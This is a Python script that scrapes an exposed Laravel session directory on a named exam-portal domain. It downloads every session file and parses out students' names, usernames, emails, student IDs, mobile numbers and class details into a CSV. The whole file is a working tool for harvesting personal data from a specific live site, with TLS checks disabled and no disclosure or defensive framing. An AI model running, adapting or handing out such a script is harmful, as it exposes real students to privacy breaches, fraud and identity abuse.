import requests
import re
import csv
import time

URL = "https://student.citexams.in/storage/framework/sessions/"

def extract_serialized_value(data, key):
    # Regex for string: "key";s:length:"value"
    match = re.search(rf'"{key}";s:(\d+):"([^"]+)"', data)
    if match:
        return match.group(2)
    # Regex for integer: "key";i:number
    match = re.search(rf'"{key}";i:(\d+)', data)
    if match:
        return match.group(1)
    return ""

def fetch_and_parse():
    print("[*] Fetching directory listing...")
    resp = requests.get(URL, verify=False, timeout=10)
    
    # Find all session IDs (mixed case hex 40 chars)
    session_ids = re.findall(r'href="([a-zA-Z0-9]{40})"', resp.text)
    print(f"[+] Found {len(session_ids)} session files.")
    
    if not session_ids:
        print("[-] No session files found. Exiting.")
        return
    
    results = []
    total = len(session_ids)
    for idx, sid in enumerate(session_ids, 1):
        print(f"    Downloading {idx}/{total}: {sid}")
        try:
            file_url = URL + sid
            file_resp = requests.get(file_url, verify=False, timeout=5)
            raw_data = file_resp.text
            
            row = {
                "session_id": sid,
                "student_name": extract_serialized_value(raw_data, "student_name"),
                "user_name": extract_serialized_value(raw_data, "user_name"),
                "email": extract_serialized_value(raw_data, "email"),
                "student_id": extract_serialized_value(raw_data, "student_id"),
                "customer_id": extract_serialized_value(raw_data, "customer_id"),
                "mobile_no": extract_serialized_value(raw_data, "mobile_no"),
                "branch_name": extract_serialized_value(raw_data, "branch_name"),
                "class_name": extract_serialized_value(raw_data, "class_name"),
                "last_url": extract_serialized_value(raw_data, "url"),
            }
            results.append(row)
        except Exception as e:
            print(f"    [!] Error with {sid}: {e}")
        # Small delay to avoid hammering the server
        time.sleep(0.1)
    
    # Write to CSV
    if results:
        fieldnames = ["session_id", "student_name", "user_name", "email", "student_id", "customer_id", "mobile_no", "branch_name", "class_name", "last_url"]
        with open("students_sessions.csv", "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(results)
        print(f"\n[+] Done! Saved {len(results)} records to students_sessions.csv")
    else:
        print("[-] No data parsed.")

if __name__ == "__main__":
    fetch_and_parse()